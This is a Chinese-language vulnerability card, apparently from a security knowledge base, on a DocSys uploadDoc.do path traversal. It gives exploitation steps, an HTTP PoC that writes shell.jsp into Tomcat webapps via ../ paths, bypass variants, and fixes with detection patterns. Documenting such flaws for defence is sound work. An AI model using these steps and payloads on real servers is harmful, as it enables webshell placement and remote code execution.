---
id: web-generic-file-upload-docsys-uploaddoc-path-name-traversal-jsp
title: DocSys uploadDoc.do 的 path/name 未校验：目录穿越把文件写到 webapps 落地 jsp，新建文件写入接口同样可越界
type: scenario
domain: web
path: web/generic/file-upload
technique: java-upload-path-name-traversal-webapp-jsp
aliases:
- DocSys 任意文件上传
- MxsDoc uploadDoc.do 穿越
- updateRealDoc FileUtil.saveFile 路径穿越
- 文件管理系统上传与新建写入穿越
- 上传 path 参数穿越写 jsp
tags:
- java
- path-traversal
- file-upload
- arbitrary-file-write
- webshell
- tomcat
- docs-management
cve: []
severity: high
confidence: medium
status: verified
affected_versions: DocSys V2.02.36（原文使用该 war 包复现，未给修复版本）
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W3
  verified_at: '2026-11-08T19:33:50+08:00'
  notes: 已对照原文核对；本次核对未读取图片；uploadDoc.do 的 path/name 无校验、addDoc→updateRealDoc→FileUtil.saveFile 与 updateRealDocContent→saveRealDocContentEx→saveDataToFile 两条 sink 与正文贴出的代码一致；穿越成功落 jsp 的截图未读，鉴权前提按正文保守表述为需仓库访问权
---

## 一句话结论

DocSys（MxsDoc）的文件上传接口 `uploadDoc.do` 只校验了业务侧权限与仓库归属，却没有校验请求里的 `path` 与 `name`；这两个值一路传到 `updateRealDoc` → `FileUtil.saveFile`，拼接出的落盘路径可以带 `../` 跳出仓库目录，因此能把任意内容的文件（含 `.jsp`）写到 Tomcat 的 `webapps` 下，形成 RCE。同一套仓库路径逻辑在"新建文件/保存内容"接口 `updateRealDocContent` → `saveRealDocContentEx` → `FileUtil.saveDataToFile` 上重复出现，是同一个根因的第二个落盘点。

## 原理

- 这类文档管理系统的设计是：仓库（repos）在磁盘上有一个根目录，接口收 `path`（相对子路径）与 `name`（文件名），服务端拼成 `reposRoot + path + name` 后读写。安全性完全依赖对拼接结果的规范化与包含校验。
- `uploadDoc.do` 里做了大量业务校验（是否有该仓库访问权、chunk 相关参数、dbDoc 是否存在），但处理分支进入 `addDoc`/`updateDoc` 后重新从 `doc` 对象取路径，直接 `FileUtil.saveFile(...)`；`java.io.File` 只在打开时解析 `..`，所以 `path=../..` 会被文件系统老老实实向上跳。
- 同一段代码里 `commitMsg` 缺省值还直接拼了 `path + name`，说明这两个参数被认为是"展示用的字符串"，而不是需要校验的路径片段——这是典型的信任边界判断错误。
- 写入 sink 不止一处：新建文件功能的 `updateRealDocContent` 取 `doc` 里的 path 调 `saveRealDocContentEx`，最后 `FileUtil.saveDataToFile` 落盘，同样没有路径检查。攻击者可以用"创建文件"接口写出内容确定、路径可控的文件，不依赖 multipart 上传。
- 落到 `webapps` 下能被解析的前提是：Tomcat 与应用同盘、攻击者知道部署路径（默认 `/webapps/DocSystem` 或同级目录），且容器未禁止在该目录写 jsp。

## 触发条件

- 已获得可上传/新建文件的会话（该系统的仓库访问权），或接口鉴权可绕过；原文未证明未授权可打，不能默认未授权。
- 上传接口的 `path`/`name` 未被白名单、未被 `getCanonicalPath()` 包含校验。
- 应用进程对目标目录（如 Tomcat `webapps`）有写权限；容器与 Tomcat 同机同盘。
- `web.xml` 未禁止 jsp 解析，或可写 `.jspx`/`.jsp` 的可访问子目录。

## 利用步骤

1. 登录并创建一个仓库，把仓库默认存放目录改到非系统盘（避免默认落在 C 盘），随后进入该仓库。
2. 上传任意文件并抓包，定位 `uploadDoc.do`，确认参数含 `path`、`name`、`chunkNum`、`chunkSize` 等。
3. 把 `path` 改成逐级 `../` 的相对路径（如 `../../../../webapps/DocSystem/`），`name` 用 `shell.jsp`，文件内容为最小 jsp webshell。
4. 观察响应 `rt` 是否 success，再访问 `http://target/DocSystem/shell.jsp` 验证解析。
5. 若上传被 chunk/类型逻辑挡住，改走"新建文件 + 保存内容"接口，用同样的 `path` 穿越直接写出内容确定的文件。

## PoC

```http
POST /DocSystem/uploadDoc.do HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----x
Cookie: <会话>

------x
Content-Disposition: form-data; name="path"

../../../../webapps/DocSystem/
------x
Content-Disposition: form-data; name="name"

shell.jsp
------x
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<% out.print("ok"); %>
------x--
```

```text
# 落盘路径等价于
new File(reposRoot, "../../../../webapps/DocSystem/" + "shell.jsp")
# 无 canonical 校验，最终写到 webapps/DocSystem/shell.jsp
```

## 变体与关联

- 变体（写入 sink）：`updateRealDocContent` → `saveRealDocContentEx` → `FileUtil.saveDataToFile`，走"保存文件内容"而不是 multipart；路径来自 `doc` 对象，同样未规范化。
- 变体（同根因的读/删）：预览接口的读取分支（`readRealDocContentEx`）与删除功能同样不校验 `path`，可以只读配置文件或删除任意文件，见关联卡。
- 变体（落点）：Windows 下用 `..\..\`、盘符绝对路径；Tomcat 可写目录除 `webapps` 还有 `conf`、`work`；也可写 `.jspx`、`WEB-INF/classes` 之外的可访问扩展。
- 关联：[[web-generic-file-upload-multipart-filename-jsp-tomcat-webshell]]（multipart 文件名穿越）、[[web-generic-file-upload-cmsv6-inspect-file-upload-folder-traversal]]（folder 参数穿越）；本条差异在于"业务校验齐全但路径参数完全缺席"+ 第二个"新建文件写入"落盘点。
- 边界：若服务端在拼接后做 `getCanonicalPath()` 并校验 `startsWith(reposRoot)`，或容器禁止在 webapps 写脚本，则本条退化为仅能覆盖仓库内文件。

## 检测与防御

- 修复：拼接后 `getCanonicalPath()` 与仓库根做前缀比较；`name` 只允许白名单字符且禁止分隔符与 `..`；上传分片临时目录与最终目录分离并统一走安全写文件 API。
- 加固：Tomcat 以只读方式挂载 webapps（容器场景），应用进程对部署目录无写权限；上传目录关闭脚本解析。
- 检测：请求体出现 `../`、`..\`、`%2e%2e`、绝对路径；`uploadDoc.do` 或文件保存接口落盘路径不在仓库根下；webapps 目录出现新增 `.jsp/.jspx` 文件。
- 审计：搜索 `FileUtil.saveFile`、`saveDataToFile`、`new File(` 的调用点，回溯 `path`/`name` 来源与是否做过规范化校验。
